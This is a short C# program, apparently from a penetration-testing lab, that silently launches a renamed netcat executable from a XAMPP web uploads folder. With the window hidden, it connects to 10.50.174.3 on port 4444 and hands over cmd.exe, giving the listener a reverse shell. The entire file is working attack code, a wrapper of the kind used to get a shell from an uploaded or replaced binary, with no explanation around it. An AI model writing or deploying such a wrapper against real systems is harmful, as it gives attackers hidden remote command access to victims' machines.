using System;
using System.Diagnostics;

namespace Wrapper{
    class Program{
        static void Main(){
		Process proc = new Process();
		ProcessStartInfo procInfo = new ProcessStartInfo("C:\\xampp\\htdocs\\resources\\uploads\\nc-Morzan.exe", "10.50.174.3 4444 -e cmd.exe");
		procInfo.CreateNoWindow = true;
		proc.StartInfo = procInfo;
		proc.Start();
        }
    }
}
